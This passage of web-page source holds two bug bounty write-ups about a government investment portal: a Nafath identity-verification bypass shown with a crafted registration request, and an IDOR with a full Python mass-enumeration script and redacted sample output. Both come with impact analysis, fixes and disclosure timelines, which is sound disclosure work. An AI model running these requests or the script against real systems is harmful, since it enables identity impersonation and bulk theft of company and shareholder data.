          During a bug bounty engagement on a government investment portal, I discovered a{' '}
          <span className="text-cyber-red font-semibold">Critical-severity authentication bypass</span>{' '}
          in the platform's Nafath identity verification integration. The registration flow
          presented a Nafath challenge that was supposed to prove ownership of the supplied
          national ID — but the backend{' '}
          <span className="text-cyber-red font-semibold">never validated that the challenge was approved</span>{' '}
          before creating the account. An attacker could skip the entire verification step by
          sending the registration request directly, registering under any citizen's national ID
          without their knowledge or consent.
        </P>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
          {[
            { label: 'Severity', value: 'Critical',             color: '#ff4455' },
            { label: 'Type',     value: 'Auth Bypass',          color: '#00ff88' },
            { label: 'Platform', value: 'Bug Bounty',           color: '#00cfff' },
            { label: 'Impact',   value: 'Identity Impersonation', color: '#ff4455' },
          ].map(({ label, value, color }) => (
            <div key={label} className="bg-cyber-bg/60 rounded-lg p-3 border border-cyber-border/40">
              <p className="font-mono text-xs text-gray-600 mb-1">{label}</p>
              <p className="font-mono text-xs font-bold leading-snug" style={{ color }}>{value}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Step 1 ───────────────────────────────── */}
      <H2>Step 1 — Understanding the Nafath Verification Model</H2>
      <P>
        The platform used Nafath — Saudi Arabia's national digital identity verification
        service — as the authoritative method for proving that a registering user is
        who they claim to be. The intended flow was:
      </P>

      <CodeBlock language="bash" filename="expected_flow.txt" code={`# Expected registration flow
1. User visits the registration page
2. User fills in account details (name, email, password)
3. Platform presents a Nafath verification popup
4. User enters their National ID → platform calls Nafath API
5. Nafath sends a push notification to the citizen's registered mobile
6. Citizen opens the Nafath app and taps "Approve"
7. Platform receives the Nafath approval callback
8. Backend creates the account — National ID ownership confirmed ✓

# The security guarantee: only the physical holder of the Nafath-registered
# device (the real citizen) can approve the challenge.`} />

      <Callout type="info" title="What Is Nafath?">
        Nafath (نفاذ) is Saudi Arabia's unified national digital identity platform, equivalent
        to services like FranceConnect or Sweden's BankID. It issues push notifications to a
        citizen's registered device to confirm identity for government and financial services.
        When a platform delegates identity verification to Nafath, it implicitly trusts that
        a successfully verified national ID was confirmed by the physical device owner.
      </Callout>

      <P>
        The security model depends entirely on Step 6 — the citizen's in-app approval. If
        the platform allows account creation without confirming that approval occurred, the
        entire Nafath integration is meaningless. That is exactly the flaw I found.
      </P>

      {/* ── Step 2 ───────────────────────────────── */}
      <H2>Step 2 — Mapping the Registration Request</H2>
      <P>
        I navigated to the platform's registration page and initiated the flow with Burp
        Suite running as proxy. Upon clicking <IC>Complete Profile</IC>, a Nafath
        verification popup appeared asking for my national ID. I entered a test value
        and captured all outbound requests.
      </P>
      <P>
        The Nafath verification step triggered a POST request that established my session.
        I copied the <IC>Cookie</IC> header and <IC>X-Usertoken</IC> header from this
        request — these are the only credentials required for subsequent API calls.
      </P>

      <Callout type="warning" title="Session Token Acquisition">
        The <IC>X-Usertoken</IC> and session cookies can be extracted from any request
        sent to the server during the Nafath flow — including the initial challenge
        request. No prior account or authenticated session is required; initiating the
        Nafath popup is sufficient.
      </Callout>

      <P>
        With the session tokens in hand, I examined the registration API call that the
        frontend would send <em>after</em> Nafath approval. This is a{' '}
        <IC>POST</IC> to the registration endpoint with a JSON payload containing
        the account details — including the <IC>nationalID</IC> field.
      </P>

      {/* ── Step 3 ───────────────────────────────── */}
      <H2>Step 3 — Bypassing the Verification</H2>
      <P>
        The critical question: does the backend verify that the Nafath challenge for
        the supplied <IC>nationalID</IC> was actually approved before creating the account?
      </P>
      <P>
        To test this, I sent the registration POST request <span className="text-cyber-red font-semibold">
        immediately after capturing the session tokens — without waiting for or completing
        the Nafath approval step</span>. I populated the <IC>nationalID</IC> and{' '}
        <IC>userid</IC> fields with a national ID that was not my own:
      </P>

      <HttpBox
        label="Crafted Registration Request — Nafath Skipped"
        type="request"
        content={`POST /api/now/sp/widget/<endpoint-id>?id=register HTTP/1.1
Host: portal.example.com
Cookie: <session-cookies>
X-Usertoken: <user-token>
Content-Type: application/json;charset=UTF-8
Accept: application/json
Origin: https://portal.example.com
Referer: https://portal.example.com/register

{
  "action":        "register",
  "nationalID":    "<target-national-id>",
  "userid":        "<target-national-id>",
  "first_name":    "Test",
  "last_name":     "User",
  "email":         "attacker@example.com",
  "phone_number":  "0XXXXXXXXX",
  "password":      "Str0ng@Pass123",
  // ... UI configuration fields omitted for brevity
}`}
      />

      <HttpBox
        label="Server Response — 201 Created"
        type="response"
        content={`HTTP/1.1 201 Created
Content-Type: application/json

{
  "result": {
    "status": "success",
    "user_created": true
  }
}`}
      />

      <Callout type="danger" title="Bypass Confirmed — No Nafath Validation Performed">
        The server returned <IC>201 Created</IC> without any Nafath approval ever being
        issued or received. The backend accepted the registration with the target national
        ID purely based on the request body — no out-of-band verification with the Nafath
        API was enforced. The Nafath popup was entirely a client-side ceremony.
      </Callout>

      {/* ── Step 4 ───────────────────────────────── */}
      <H2>Step 4 — Confirming Identity Impersonation</H2>
      <P>
        With the account created, I navigated to the login page and authenticated using
        the target national ID as the username and the attacker-chosen password.
        The login succeeded immediately.
      </P>
      <P>
        To confirm the impersonation was complete and not just a registration artifact,
        I opened browser DevTools on the authenticated profile page and searched for the
        national ID in the page state. The target's national ID appeared in the platform's
        session context — confirming the account was fully registered and authenticated
        under the victim's government identity.
      </P>

      <div className="my-5 space-y-2">
        {[
          { n: '01', step: 'Initiate Nafath flow → capture session cookies and X-Usertoken',  color: '#9ca3af' },
          { n: '02', step: 'Send registration POST with victim\'s nationalID — skip Nafath approval', color: '#f97316' },
          { n: '03', step: 'Server responds 201 Created — account exists under victim\'s national ID', color: '#ff4455' },
          { n: '04', step: 'Login with victim\'s national ID + attacker\'s password — success',       color: '#ff4455' },
          { n: '05', step: 'Full access to all platform services under the victim\'s government identity', color: '#ff4455' },
        ].map(({ n, step, color }) => (
          <div key={n} className="flex items-start gap-3 glass-card px-4 py-3">
            <span className="font-mono text-xs font-bold flex-shrink-0 mt-0.5" style={{ color }}>{n}</span>
            <span className="text-sm text-gray-400">{step}</span>
          </div>
        ))}
      </div>

      {/* ── Impact ───────────────────────────────── */}
      <H2>Impact Assessment</H2>
      <div className="glass-card overflow-hidden my-5">
        <div className="px-5 py-3 bg-cyber-red/10 border-b border-cyber-red/20 font-mono text-xs text-cyber-red font-semibold">
          CVSS v3.1 Score: 9.8 CRITICAL — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        </div>
        <div className="p-5 space-y-3">
          {[
            { label: 'Attack Vector',       value: 'Network',    color: '#ff4455' },
            { label: 'Attack Complexity',   value: 'Low',        color: '#ff4455' },
            { label: 'Privileges Required', value: 'None',       color: '#ff4455' },
            { label: 'User Interaction',    value: 'None',       color: '#ff4455' },
            { label: 'Scope',               value: 'Unchanged',  color: '#9ca3af' },
            { label: 'Confidentiality',     value: 'High',       color: '#ff4455' },
            { label: 'Integrity',           value: 'High',       color: '#ff4455' },
            { label: 'Availability',        value: 'High',       color: '#ff4455' },
          ].map(({ label, value, color }) => (
            <div key={label} className="flex items-center justify-between py-1.5 border-b border-cyber-border/20 last:border-0">
              <span className="font-mono text-xs text-gray-500">{label}</span>
              <span className="font-mono text-xs font-bold" style={{ color }}>{value}</span>
            </div>
          ))}
        </div>
      </div>

      <P>Confirmed impact of this vulnerability:</P>
      <ul className="space-y-2 mb-6 ml-2">
        {[
          'Complete national identity impersonation — attacker can register as any citizen without their knowledge or device',
          'Authentication under victim\'s identity — full access to platform services (facility management, license operations, compliance submissions) attributed to the victim',
          'Abuse of government trust — actions performed by the attacker appear in audit logs as belonging to the legitimate citizen',
          'Account lockout vector — if the attacker registers first, the legitimate citizen may be unable to register their own ID ("user already exists")',
          'Credential stuffing amplification — attacker sets their own password for the victim\'s account, enabling persistent access',
          'Regulatory non-compliance — bypassing Nafath violates Saudi national identity security requirements for e-government services',
        ].map((item, i) => (
          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
            <span className="text-cyber-red mt-1 flex-shrink-0">→</span>
            <span>{item}</span>
          </li>
        ))}
      </ul>

      {/* ── Recommendations ──────────────────────── */}
      <H2>Recommendations &amp; Remediation</H2>
      <div className="space-y-3 mb-6">
        {[
          {
            num: '01',
            title: 'Enforce Server-Side Nafath Callback Validation',
            desc: 'The backend must verify the Nafath approval callback before creating any account. Registration must be blocked until the platform receives and validates a signed, in-scope Nafath approval event for the exact nationalID being registered.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '02',
            title: 'Bind Registration Sessions to Nafath Outcomes',
            desc: 'Issue a short-lived, single-use registration token only after a successful Nafath approval callback. The final account creation POST must present this token. Without it, the request must be rejected regardless of what is in the nationalID field.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '03',
            title: 'Validate nationalID Ownership on the Server',
            desc: 'The server must cross-reference the nationalID in the request body against the nationalID returned in the Nafath approval payload. Client-supplied values must never be trusted for identity — only the Nafath-verified identity should be used.',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '04',
            title: 'Rate-Limit Registration Attempts Per Session',
            desc: 'Enforce strict rate limits (e.g., 3 attempts per IP per hour) on the registration endpoint to slow brute-force identity enumeration. Flag and alert on any session that submits multiple distinct nationalID values.',
            priority: 'P2 — Medium Term',
            color: '#00cfff',
          },
        ].map(({ num, title, desc, priority, color }) => (
          <div key={num} className="glass-card p-4 flex gap-4">
            <div className="font-mono text-2xl font-bold opacity-20 flex-shrink-0 w-8">{num}</div>
            <div className="flex-1 min-w-0">
              <div className="flex items-start justify-between gap-3 mb-1.5">
                <h4 className="font-mono font-semibold text-white text-sm">{title}</h4>
                <span className="font-mono text-xs px-2 py-0.5 rounded-full border flex-shrink-0" style={{ color, borderColor: color + '50', backgroundColor: color + '10' }}>
                  <span className="sm:hidden">{priority.split(' — ')[0]}</span>
                  <span className="hidden sm:inline">{priority}</span>
                </span>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
            </div>
          </div>
        ))}
      </div>

      {/* ── Timeline ─────────────────────────────── */}
      <H2>Disclosure Timeline</H2>
      <div className="glass-card overflow-hidden my-5">
        {[
          { date: 'Day 1',  event: 'Registration flow intercepted; Nafath verification popup identified',            color: 'text-gray-400' },
          { date: 'Day 1',  event: 'Session tokens extracted from Nafath challenge request',                         color: 'text-cyber-blue' },
          { date: 'Day 1',  event: 'Registration POST sent without completing Nafath — 201 Created returned',        color: 'text-cyber-red' },
          { date: 'Day 1',  event: 'Login with target national ID confirmed — identity impersonation verified',      color: 'text-cyber-red' },
          { date: 'Day 1',  event: 'Full report submitted to the bug bounty program with HTTP transcripts',          color: 'text-cyber-green' },
          { date: 'Day 5',  event: 'Program acknowledged the report and initiated triage',                           color: 'text-gray-400' },
          { date: 'Day 12', event: 'Vulnerability confirmed as Critical; fix initiated by the security team',        color: 'text-yellow-400' },
          { date: 'Day 28', event: 'Patch deployed — server-side Nafath callback validation enforced',               color: 'text-cyber-green' },
        ].map(({ date, event, color }, i) => (
          <div key={i} className="flex items-start gap-4 px-5 py-3 border-b border-cyber-border/20 last:border-0 hover:bg-cyber-bg/30 transition-colors">
            <span className="font-mono text-xs text-gray-600 w-12 flex-shrink-0">{date}</span>
            <span className={`font-mono text-xs ${color}`}>{event}</span>
          </div>
        ))}
      </div>

      {/* ── Conclusion ───────────────────────────── */}
      <H2>Conclusion</H2>
      <P>
        This vulnerability illustrates one of the most dangerous failure modes in
        third-party authentication integration: implementing the <em>user-facing</em>{' '}
        flow correctly while neglecting to enforce the verification outcome on the backend.
        The Nafath popup gave the appearance of strong identity verification — but without
        a server-side check confirming the approval, it was pure theater.
      </P>
      <P>
        The core principle violated is{' '}
        <span className="text-cyber-red font-semibold">never trust client-supplied identity claims</span>.
        The <IC>nationalID</IC> field in the registration payload must be treated as
        attacker-controlled data. The only value that can be trusted is the one returned
        by the Nafath API in a verified, signed approval callback — bound to the current
        session and validated server-side before any account is created.
      </P>
      <P>
        Authentication integrations with national identity systems carry an unusually high
        responsibility. When Nafath verification is bypassed, the attacker doesn't just
        gain access to an account — they assume a government-recognized identity, with all
        the legal, financial, and civic implications that entails.
      </P>

      <Callout type="info" title="Tools Used in This Assessment">
        <span className="flex flex-wrap gap-2 mt-1">
          {['Burp Suite', 'Burp Repeater', 'Browser DevTools', 'Nafath App'].map(t => (
            <IC key={t}>{t}</IC>
          ))}
        </span>
      </Callout>

    </div>
  )
}

/* ─── License IDOR Post ─────────────────────────────── */
function IDORLicensePost() {
  return (
    <div className="text-gray-400 text-sm leading-relaxed">

      {/* ── Overview ─────────────────────────────── */}
      <div className="glass-card p-5 sm:p-6 mb-8 border-l-4 border-orange-500">
        <h3 className="font-mono font-bold text-white text-base mb-3 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 text-orange-400" /> Executive Summary
        </h3>
        <P>
          During a bug bounty engagement on a government investment platform, I identified a{' '}
          <span className="text-orange-400 font-semibold">High-severity IDOR vulnerability</span>{' '}
          in the investor license verification API. The endpoint accepted{' '}
          <span className="text-orange-400 font-semibold">partial input — as few as 4 digits</span>{' '}
          instead of the required full 12-digit Mi-license number, and returned complete company
          and shareholder records with no authorization check. By iterating all 10,000 four-digit
          combinations (<IC>0000</IC>–<IC>9999</IC>), an authenticated attacker could enumerate
          the entire investor database in minutes.
        </P>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
          {[
            { label: 'Severity', value: 'High',       color: '#f97316' },
            { label: 'Type',     value: 'IDOR',        color: '#00ff88' },
            { label: 'Platform', value: 'Bug Bounty',  color: '#00cfff' },
            { label: 'Bounty',   value: 'SAR 5,651',   color: '#10b981' },
          ].map(({ label, value, color }) => (
            <div key={label} className="bg-cyber-bg/60 rounded-lg p-3 border border-cyber-border/40">
              <p className="font-mono text-xs text-gray-600 mb-1">{label}</p>
              <p className="font-mono text-xs font-bold" style={{ color }}>{value}</p>
            </div>
          ))}
        </div>
        <div className="mt-3 px-3 py-2 rounded-lg bg-orange-500/5 border border-orange-500/20 font-mono text-xs text-orange-400/80">
          ⚡ Marked as duplicate — another researcher submitted the same finding earlier.
          The program rewarded the report regardless due to quality of documentation.
        </div>
      </div>

      {/* ── Step 1 ───────────────────────────────── */}
      <H2>Step 1 — Reconnaissance &amp; Application Mapping</H2>
      <P>
        The target was a government-operated investment platform used by foreign investors to register
        companies, manage industrial facilities, and verify business licenses issued by the relevant
        national authority. The platform enforces an onboarding flow before an investor can perform
        any privileged actions: they must link a valid Mi-license number to their account.
      </P>
      <P>
        After registering as a foreign investor and logging in, I was redirected to a profile
        completion screen with a single call-to-action — <IC>Complete Profile</IC>. Clicking it
        opened a modal with one input field: the investor's 12-digit Mi-license number. The UI
        presented this as a strict validation step before proceeding to facility management.
      </P>

      <Callout type="info" title="What Is an Mi-License?">
        An Mi-license (Investor License) is a government-issued identifier assigned to registered
        foreign investors and companies. It authorizes specific commercial activities, facility
        management, and product imports. The format is a{' '}
        <IC>12-digit number</IC> followed by a branch suffix — e.g.{' '}
        <IC>111030031212-01</IC>. Investors need this number to operate on the platform; it
        serves as the primary business identity credential.
      </Callout>

      <P>
        My first move was to intercept this form submission in Burp Suite to understand the
        underlying API call: which endpoint handled verification, how the license number was
        transmitted, and whether any server-side access control tied the response to the
        requesting user's account.
      </P>

      {/* ── Step 2 ───────────────────────────────── */}
      <H2>Step 2 — Intercepting the Verification Request</H2>
      <P>
        With Burp Suite running as the browser proxy, I entered a random 12-digit number in
        the modal and captured the outgoing request. The application issued a plain{' '}
        <IC>GET</IC> request with the license number embedded directly in the URL path:
      </P>

      <HttpBox
        label="Normal Request — Full 12-Digit License Lookup"
        type="request"
        content={`GET /v2.0/en/public/profilemanagement/api/app/mi/121331432121?api-version=2.0 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Origin: https://profile.example.com
Referer: https://profile.example.com/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`}
      />

      <P>
        The API returned <IC>404 Not Found</IC> for my invented number — the expected behavior.
        However, several design choices stood out immediately:
      </P>
      <ul className="space-y-2 mb-5 ml-2">
        {[
          'The license number was a bare path segment — no hashing, signing, or obfuscation.',
          'The only security layer was the Authorization header (a JWT for any valid account).',
          'The endpoint was marked public in the path (/public/profilemanagement) — suggesting it may not enforce ownership checks.',
          'No CSRF token or per-request nonce was required.',
        ].map((item, i) => (
          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
            <span className="text-orange-400 mt-1 flex-shrink-0">→</span>
            <span>{item}</span>
          </li>
        ))}
      </ul>
      <P>
        The combination of a public endpoint, path-parameter-based lookup, and no apparent
        ownership verification prompted me to test whether the backend performed an{' '}
        <span className="text-cyber-blue font-semibold">exact match</span> or a{' '}
        <span className="text-cyber-blue font-semibold">partial / substring match</span> on
        the license number.
      </P>

      {/* ── Step 3 ───────────────────────────────── */}
      <H2>Step 3 — Exploiting Partial Input Acceptance</H2>
      <P>
        In Burp Repeater, I replaced the full 12-digit number with just{' '}
        <IC>1111</IC> — four digits. The response was not a 404.
        It was a <IC>200 OK</IC> with a full company record:
      </P>

      <HttpBox
        label="Modified Request — 4-Digit Partial Input"
        type="request"
        content={`GET /v2.0/en/public/profilemanagement/api/app/mi/1111?api-version=2.0 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Origin: https://profile.example.com
Referer: https://profile.example.com/`}
      />

      <HttpBox
        label="Server Response — 200 OK (Full Record Returned)"
        type="response"
        content={`HTTP/2 200 OK
Content-Type: application/json

{
  "licenseNumber":     "111030031212-01",
  "licenseStatus":     "Active",
  "licenseIssueDate":  "2002-11-23",
  "licenseExpiryDate": "2026-08-10",
  "licenseType":       "ISIC/Regular Investment Registration",
  "licenseProducts": [
    { "productID": "39232100", "productName": "[REDACTED]", "quantity": "3000.000", "unit": "001" },
    { "productID": "39151000", "productName": "[REDACTED]", "quantity": "2000.000", "unit": "001" }
  ],
  "company": {
    "companyID":          "[REDACTED]",
    "companyName":        "[REDACTED]",
    "companyCapital":     "9200000",
    "companyLaborSize":   "75",
    "companyLegalStatus": "Individual LLC",
    "companyAddress": {
      "addressLine1": "[REDACTED]",
      "country":      "Saudi Arabia",
      "city":         "[REDACTED]",
      "zipCode":      "[REDACTED]"
    },
    "companyContact": {
      "email":           "[REDACTED]@example.com",
      "telephoneNumber": "XXXXXXXXXX",
      "mobile":          "XXXXXXXXXX"
    }
  },
  "companyShareholders": [
    {
      "shareholderID":         "[REDACTED]",
      "shareholderName":       "[REDACTED]",
      "ownershipPercentage":   "100.0000000",
      "investedCapital":       "5000000.00"
    }
  ]
}`}
      />

      <Callout type="danger" title="IDOR Confirmed — Zero Ownership Check">
        Supplying only <IC>1111</IC> caused the server to return a complete company record.
        The backend was performing a suffix or substring match rather than an exact lookup.
        Critically, the authenticated JWT belonged to an entirely unrelated foreign investor
        account — proving there was no server-side check tying the response to the
        requesting user's ownership of that license.
      </Callout>

      <P>
        The response revealed a compounding flaw: the <IC>licenseNumber</IC> field contained
        the <span className="text-cyber-red font-semibold">full 12-digit identifier</span>{' '}
        (<IC>111030031212-01</IC>). An attacker could therefore use a 4-digit guess to{' '}
        <span className="text-cyber-red font-semibold">recover a valid complete license number</span>{' '}
        they never legitimately possessed.
      </P>

      {/* ── Step 4 ───────────────────────────────── */}
      <H2>Step 4 — Impact Chain: License Impersonation</H2>
      <P>
        The platform's profile completion flow accepts a Mi-license number and links it to the
        investor's account — granting them facility management permissions under that license.
        Once full license numbers are harvested via the IDOR, they can be fed back into this
        same flow to <span className="text-cyber-red font-semibold">impersonate a legitimate company</span> on a government platform:
      </P>
      <div className="my-5 space-y-2">
        {[
          { n: '01', step: 'Enumerate license numbers via the IDOR endpoint (10,000 requests)', color: '#f97316' },
          { n: '02', step: 'Identify an active license from a legitimate registered company',   color: '#f97316' },
          { n: '03', step: 'Submit the stolen full license through the normal Complete Profile flow', color: '#facc15' },
          { n: '04', step: 'Platform links the victim company\'s license to the attacker\'s account', color: '#facc15' },
          { n: '05', step: 'Attacker gains facility management rights attributed to the victim company', color: '#ff4455' },
        ].map(({ n, step, color }) => (
          <div key={n} className="flex items-start gap-3 glass-card px-4 py-3">
            <span className="font-mono text-xs font-bold flex-shrink-0 mt-0.5" style={{ color }}>{n}</span>
            <span className="text-sm text-gray-400">{step}</span>
          </div>
        ))}
      </div>

      {/* ── Step 5 ───────────────────────────────── */}
      <H2>Step 5 — Mass Enumeration</H2>
      <P>
        The critical amplifier is the search space. A full 12-digit license number has{' '}
        10<sup>12</sup> (one trillion) possible values — brute-force is infeasible.
        But the endpoint accepted 4-digit partial input, collapsing the effective search
        space to just <span className="text-cyber-red font-semibold">10,000 combinations</span>{' '}
        (<IC>0000</IC>–<IC>9999</IC>). At a conservative 3 requests/second with no rate
        limiting, the entire space can be exhausted in under <span className="text-cyber-red font-semibold">56 minutes</span>.
      </P>
      <P>
        I wrote the following proof-of-concept to demonstrate the scale. It generates random
        4-digit strings, queries the endpoint, and prints full company records for any hit.
      </P>

      <CodeBlock language="python" filename="idor_license_enum.py" code={`#!/usr/bin/env python3
"""
IDOR Mass Enumeration PoC — License Verification Endpoint
Target: GET /v2.0/en/public/profilemanagement/api/app/mi/<partial>
Impact: Enumerate investor company records using 4-digit partial input

IMPORTANT: This script was run under controlled bug bounty conditions
with explicit program authorization. Unauthorized use is illegal.
"""

import requests
import json
import random
import sys

sys.stdout.reconfigure(encoding='utf-8')

# ── Configuration ─────────────────────────────────────────
USER_TOKEN = '<your-jwt-token>'           # Omit 'Bearer' prefix
BASE_URL   = 'https://api.example.com'
ENDPOINT   = '/v2.0/en/public/profilemanagement/api/app/mi/'

counter = 0

HEADERS = {
    'Authorization':    f'Bearer {USER_TOKEN}',
    'X-Requested-With': 'XMLHttpRequest',
    'Accept':           'application/json, text/plain, */*',
    'Accept-Language':  'en',
    'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}


# ── Helpers ───────────────────────────────────────────────
def random_4digit() -> str:
    """Return a zero-padded random 4-digit string (0000–9999)."""
    return f"{random.randint(0, 9999):04d}"


# ── Core ──────────────────────────────────────────────────
def fetch_company(partial: str) -> None:
    global counter

    url  = f"{BASE_URL}{ENDPOINT}{partial}?api-version=2.0"
    resp = requests.get(url, headers=HEADERS, timeout=10)

    if resp.status_code == 200:
        data    = resp.json()
        company = data.get('company', {})
        contact = company.get('companyContact', {})
        counter += 1

        print(f"{'─'*52} [{counter}]")
        print(f"  Full License : {data.get('licenseNumber')}")
        print(f"  Status       : {data.get('licenseStatus')}")
        print(f"  Type         : {data.get('licenseType')}")
        print(f"  Issued       : {data.get('licenseIssueDate')}")
        print(f"  Expires      : {data.get('licenseExpiryDate')}")
        print(f"  Company      : {company.get('companyName')}")
        print(f"  Capital      : SAR {company.get('companyCapital')}")
        print(f"  Employees    : {company.get('companyLaborSize')}")
        print(f"  Email        : {contact.get('email')}")
        print(f"  Phone        : {contact.get('telephoneNumber')}")

        shareholders = data.get('companyShareholders', [])
        for sh in shareholders:
            pct = sh.get('ownershipPercentage', '?')
            print(f"  Shareholder  : {sh.get('shareholderName')} ({pct}%)")
        print()

    elif resp.status_code == 500:
        print("[-] Bearer token expired or unauthorized — exiting.")
        sys.exit(1)

    else:
        print(f"  [-] {partial} → no match (HTTP {resp.status_code})")


# ── Entry point ───────────────────────────────────────────
def main():
    print("[*] IDOR Mass Enumeration — License Verification API")
    print(f"[*] Endpoint : {BASE_URL}{ENDPOINT}<4-digit>")
    print(f"[*] Space    : 0000–9999  (10,000 combinations)\\n")

    try:
        while True:
            fetch_company(random_4digit())
    except KeyboardInterrupt:
        print(f"\\n[*] Halted by user — {counter} records collected.")


if __name__ == '__main__':
    main()`} />

      <H3>PoC Output (Redacted)</H3>
      <CodeBlock language="bash" filename="enum_output.txt" code={`[*] IDOR Mass Enumeration — License Verification API
[*] Endpoint : https://api.example.com/v2.0/en/public/profilemanagement/api/app/mi/<4-digit>
[*] Space    : 0000–9999  (10,000 combinations)

  [-] 4821 → no match (HTTP 404)
  [-] 7263 → no match (HTTP 404)
──────────────────────────────────────────────── [198]
  Full License : 2030062723-01
  Status       : Active
  Type         : ISIC/Regular Investment Registration
  Issued       : 2006-06-17
  Expires      : 2026-10-03
  Company      : [REDACTED]
  Capital      : SAR [REDACTED]
  Employees    : [REDACTED]
  Email        : [REDACTED]@example.com
  Phone        : XXXXXXXXXX
  Shareholder  : [REDACTED] (100.0%)

  [-] 0793 → no match (HTTP 404)
──────────────────────────────────────────────── [199]
  Full License : 102030083682-01
  Status       : Active
  Type         : ISIC/Regular Investment Registration
  Issued       : 2009-01-03
  Expires      : 2026-06-05
  Company      : [REDACTED]
  Capital      : SAR [REDACTED]
  Employees    : [REDACTED]
  Email        : [REDACTED]@example.com
  Phone        : XXXXXXXXXX
  Shareholder  : [REDACTED] (51.0%)
  Shareholder  : [REDACTED] (49.0%)

──────────────────────────────────────────────── [200]
  Full License : 111030021352-01
  Status       : Active
  Type         : ISIC/Regular Investment Registration
  Issued       : 2007-03-18
  Expires      : 2026-07-26
  Company      : [REDACTED]
  Capital      : SAR [REDACTED]
  Employees    : [REDACTED]
  Email        : [REDACTED]@example.com
  Phone        : XXXXXXXXXX
  Shareholder  : [REDACTED] (100.0%)

[*] Halted by user — 200 records collected.`} />

      <Callout type="success" title="Reported — Duplicate, Rewarded">
        After confirming the vulnerability with the minimum necessary evidence, I submitted a
        full report including this writeup, Burp Suite HTTP transcripts, and the PoC script.
        The program triaged the report as a{' '}
        <span className="font-semibold">duplicate</span> — another researcher had submitted the
        same finding days earlier — but issued a reward of{' '}
        <span className="font-semibold text-emerald-400">SAR 5,651</span> in recognition of the
        report quality and the independently-produced PoC.
      </Callout>

      {/* ── Impact ───────────────────────────────── */}
      <H2>Impact Assessment</H2>
      <div className="glass-card overflow-hidden my-5">
        <div className="px-5 py-3 bg-orange-500/10 border-b border-orange-500/20 font-mono text-xs text-orange-400 font-semibold">
          CVSS v3.1 Score: 7.1 HIGH — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
        </div>
        <div className="p-5 space-y-3">
          {[
            { label: 'Attack Vector',       value: 'Network',    color: '#f97316' },
            { label: 'Attack Complexity',   value: 'Low',        color: '#f97316' },
            { label: 'Privileges Required', value: 'Low',        color: '#facc15' },
            { label: 'User Interaction',    value: 'None',       color: '#f97316' },
            { label: 'Scope',               value: 'Unchanged',  color: '#9ca3af' },
            { label: 'Confidentiality',     value: 'High',       color: '#f97316' },
            { label: 'Integrity',           value: 'Low',        color: '#facc15' },
            { label: 'Availability',        value: 'None',       color: '#9ca3af' },
          ].map(({ label, value, color }) => (
            <div key={label} className="flex items-center justify-between py-1.5 border-b border-cyber-border/20 last:border-0">
              <span className="font-mono text-xs text-gray-500">{label}</span>
              <span className="font-mono text-xs font-bold" style={{ color }}>{value}</span>
            </div>
          ))}
        </div>
      </div>

      <P>Confirmed impact of this vulnerability:</P>
      <ul className="space-y-2 mb-6 ml-2">
        {[
          'Full license number disclosure — 4-digit partial input recovers the complete 12-digit identifier',
          'Company name, legal status, capital, and employee count exposed at scale',
          'Executive email addresses and direct phone numbers leaked for every matched record',
          'Registered physical addresses disclosed, enabling targeted physical attacks',
          'Shareholder identities — beneficial owner names, IDs, and capital stakes exposed',
          'License impersonation — stolen identifiers can be used to fraudulently assume another company\'s identity on a government platform',
          'Mass enumeration trivially achievable — 10,000 requests, completable in under one hour',
        ].map((item, i) => (
          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
            <span className="text-orange-400 mt-1 flex-shrink-0">→</span>
            <span>{item}</span>
          </li>
        ))}
      </ul>

      {/* ── Recommendations ──────────────────────── */}
      <H2>Recommendations &amp; Remediation</H2>
      <div className="space-y-3 mb-6">
        {[
          {
            num: '01',
            title: 'Enforce Exact Input Validation',
            desc: 'Reject any input that does not match the full 12-digit license format before querying the database. Apply strict server-side regex (e.g. /^\\d{12}$/) — client-side validation alone is trivially bypassed via Burp Suite.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '02',
            title: 'Replace Partial Matching with Exact Lookup',
            desc: 'The database query must use strict equality (WHERE license_number = ?) rather than LIKE, CONTAINS, or suffix operators. Partial matching has no legitimate use case in license verification — a user either knows their full number or they do not.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '03',
            title: 'Enforce Server-Side Authorization',
            desc: 'Returning a license record must require proof of ownership. The authenticated user\'s session must be tied to the requested license before any data is returned. A valid JWT alone is authentication, not authorization over arbitrary records.',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '04',
            title: 'Apply Rate Limiting & Anomaly Detection',
            desc: 'Enforce strict per-token rate limits on this endpoint (e.g., 5 attempts per session). Flag and alert on high-frequency or sequential lookups — a legitimate user completing their own profile needs at most a handful of requests.',
            priority: 'P2 — Medium Term',
            color: '#00cfff',
          },
        ].map(({ num, title, desc, priority, color }) => (
          <div key={num} className="glass-card p-4 flex gap-4">
            <div className="font-mono text-2xl font-bold opacity-20 flex-shrink-0 w-8">{num}</div>
            <div className="flex-1 min-w-0">
              <div className="flex items-start justify-between gap-3 mb-1.5">
                <h4 className="font-mono font-semibold text-white text-sm">{title}</h4>
                <span className="font-mono text-xs px-2 py-0.5 rounded-full border flex-shrink-0" style={{ color, borderColor: color + '50', backgroundColor: color + '10' }}>
                  <span className="sm:hidden">{priority.split(' — ')[0]}</span>
